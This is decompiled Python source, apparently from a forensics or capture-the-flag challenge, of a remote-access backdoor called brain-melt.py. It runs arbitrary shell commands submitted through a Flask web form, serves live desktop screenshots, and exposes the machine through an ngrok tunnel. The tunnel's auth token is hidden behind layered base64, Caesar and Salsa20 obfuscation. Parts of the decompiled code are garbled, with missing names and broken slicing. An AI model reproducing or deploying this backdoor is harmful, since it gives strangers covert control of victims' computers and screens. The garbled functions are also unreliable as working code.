# uncompyle6 version 3.9.1
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.10.12 (main, Nov 20 2023, 15:14:05) [GCC 11.4.0]
# Embedded file name: brain-melt.py
# Compiled at: 2024-05-21 23:08:49
# Size of source mod 2**32: 4963 bytes


from flask import Flask, flash, request, render_template_string, send_file, redirect
from wtforms import Form, StringField, validators, StringField, SubmitField
import subprocess, pyautogui, io
from PIL import Image
from Crypto.Cipher import Salsa20
from pyngrok import ngrok
import base64


DEBUG = True
app = Flask(__name__)
app.config["SECRET_KEY"] = "9EQrXQ88pwP7UWaXbkmThhKuDdYxsad1"

def decrypt1(    ):
         = ""
    for      in range(0, len(    ), 2):
             = str(    [    [:     + 2]] + "==")
             += str(base64.b64decode(    ).decode("ascii"))
    else:
        return


def decrypt2(a1, a2):
    result = ""
    for character in a1:
        a2 = 9
        tempcharaddedr = "temporary value"
        result += chr((ord(character) - ord("a") + a2) % 26 + ord("a"))
    else:
        return result


def decrypt3(s1, key):
    msg_nonce = s1[None[:8]]
    ciphertext = s1[8[:None]]
    key = glob_key
    ab = key
    cipher = Salsa20.new(key=(key.encode("utf-8")), nonce=msg_nonce)
    return cipher.decrypt(ciphertext_obfuscation_padding).decode("utf-8")


def deobfuscate():
    part1 = decrypt1("ZgbAYQZwewMAOAZQOQYwYwNQYgMA")
    part2 = decrypt2("fwvcttjsfvrshwsg", 17)
    part3 = decrypt3(b'\x97p#2\x1abw\x0f\x9a\xd1Z\x04b\x93\xa1h8]\xab\xa3\x9e7\xc9\xe8\x9b', "25dbd4f362f7d0e64b24ab231728a1fc")
    key = part1 + part2 + part3
    return key


def ngrok_tunnel():
    ngrok.set_auth_token(deobfuscate())
    http_tunnel = ngrok.connect(5000, "http")


def Desktop(pil_img):
    img_io = io.BytesIO()
    pil_img.save(img_io, "JPEG", quality=70)
    img_io.seek(0)
    return send_file(img_io, mimetype="image/jpeg")


def execute(cmd):
    child = subprocess.Popen(cmd, shell=True, stdout=(subprocess.PIPE), stderr=(subprocess.PIPE))
    for line in child.stdout:
        print(line)
        l = line.decode(encoding="utf-8", errors="ignore")
        flash(l)
    else:
        for line in child.stderr:
            l = line.decode(encoding="utf-8", errors="ignore")
            flash(l)


class CommandForm(Form):
    command = StringField("Command:", validators=[validators.required()])

    @app.route("/", methods=["GET", "POST"])
    def display():
        form = CommandForm(request.form)
        print(form.errors)
        if request.method == "POST":
            command = request.form["command"]
        if form.validate() and request.method == "POST":
            result = execute(command)
            flash(result)
        else:
            flash("Please enter a command.")
        return render_template_string('<!doctype html>\n                <html>\n                    <head>\n                        <link rel="stylesheet" href="css url"/>\n                            </head>\n                                <body>\n                                    <form action="" method="post" role="form">\n                                        <div class="form-group">\n                                              <label for="Command">Command:</label>\n                                              <input type="text" class="form-control" id="command" name="command"></div>\n                                              <button type="submit" class="btn btn-success">Submit</button>\n                                              </form>\n                                            {% for message in get_flashed_messages() %}\n                                            <p>{{ message }}</p>\n                                            {% endfor %}\n                                            <img src="/images/desktop.jpg" id="img" width="100%" scrolling="yes" style="height: 100vh;"></iframe>\n                                </body>\n                            \n                            {% block javascript %}\n                            <script type="text/javascript">\n                            window.onload = function() {\n                                var image = document.getElementById("img");\n\n                                function updateImage() {\n                                    image.src = image.src.split("?")[0] + "?" + new Date().getTime();\n                                }\n\n                                setInterval(updateImage, 1000);\n                            }\n                            </script>\n                            {% endblock %}\n                            </html>\n                        ', form=form)


@app.route("/images/desktop.jpg")
def serve_img():
    screenshot = pyautogui.screenshot()
    return Desktop(screenshot)


if __name__ == "__main__":
    glob_key = "24a0b299984ee8da7aae14b7163e2e63"
    ngrok_tunnel()
    app.run(host="0.0.0.0")
# global glob_key ## Warning: Unused global

# okay decompiling ./brain-melt-2.pyc

